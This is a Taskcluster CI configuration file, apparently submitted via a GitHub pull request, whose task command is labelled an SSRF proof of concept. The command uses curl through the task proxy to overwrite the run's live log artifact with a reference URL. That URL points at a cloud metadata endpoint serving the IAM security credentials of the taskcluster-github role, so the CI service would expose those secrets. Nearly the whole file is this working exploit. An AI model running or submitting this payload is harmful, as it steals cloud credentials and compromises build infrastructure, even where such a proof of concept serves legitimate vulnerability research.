version: 1
reporting: checks-v1
policy:
  pullRequests: public
tasks:
  - $if: 'tasks_for == "github-pull-request"'
    then:
      taskId: {$eval: as_slugid("pr-task")}
      created: {$fromNow: ''}
      deadline: {$fromNow: '1 hour'}
      expires: {$fromNow: '1 day'}
      provisionerId: docker-compose
      workerType: generic-worker
      routes:
        - checks
      metadata:
        name: "PR check"
        description: "Run checks on pull request"
        owner: ${event.pull_request.user.login}@users.noreply.github.com
        source: ${event.repository.html_url}
      payload:
        maxRunTime: 600
        command:
          - - /bin/bash
            - -c
            - >-
              echo "=== SSRF PoC ===" &&
              echo "Task: $(printenv TASK_ID) Run: $(printenv RUN_ID)" &&
              curl -s -X POST
              "http://localhost:80/api/queue/v1/task/$(printenv TASK_ID)/runs/$(printenv RUN_ID)/artifacts/public%2Flogs%2Flive_backing.log"
              -H "Content-Type: application/json"
              -d "{\"storageType\":\"reference\",\"url\":\"http://172.18.0.1:9170/latest/meta-data/iam/security-credentials/taskcluster-github-role\",\"expires\":\"${fromNow('20 hours')}\",\"contentType\":\"text/plain\"}" &&
              echo "Artifact overwritten" &&
              sleep 5
        features:
          taskclusterProxy: true
